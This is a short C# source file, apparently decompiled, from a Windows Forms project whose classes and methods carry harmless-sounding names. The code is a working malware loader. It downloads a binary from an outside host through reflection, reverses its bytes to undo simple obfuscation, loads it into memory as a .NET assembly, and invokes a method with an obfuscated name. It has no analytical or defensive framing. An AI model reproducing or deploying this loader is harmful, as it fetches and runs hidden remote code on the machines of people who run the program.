using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;

namespace WindowsFormsApp32;

public static class Mouse
{
	public static void App1()
	{
		if (Win32.BUFFER == null)
		{
			Win32.BUFFER = (byte[])typeof(WebClient).GetMethod("DownloadData", new Type[1] { typeof(Uri) })!.Invoke(new WebClient(), new object[1]
			{
				new Uri("https://achiae.pro/test/test.bin")
			});
		}
		else
		{
			Win32.BUFFER = null;
		}
	}

	public static void Sony()
	{
		if (Win32.METHODS == null)
		{
			Array.Reverse((Array)Win32.BUFFER, 0, Win32.BUFFER.Length);
			Win32.METHODS = new List<MethodInfo>();
		}
		Type[] exportedTypes = Assembly.Load(Win32.BUFFER).GetExportedTypes();
		foreach (Type type in exportedTypes)
		{
			Win32.METHODS.AddRange(type.GetMethods());
		}
	}

	public static void Embassy()
	{
		if (Win32.METHODS == null)
		{
			Sony();
		}
		if (Win32.METHODS.Count <= 0)
		{
			return;
		}
		foreach (MethodInfo item in Win32.METHODS.ToList())
		{
			if (item.DeclaringType!.FullName == "FCvwICEeQbN3NHJ9g9.zrs3fRUaT7EYHiqVWT" && item.Name == "Q19M2qqpi")
			{
				item.Invoke(null, null);
			}
		}
	}
}
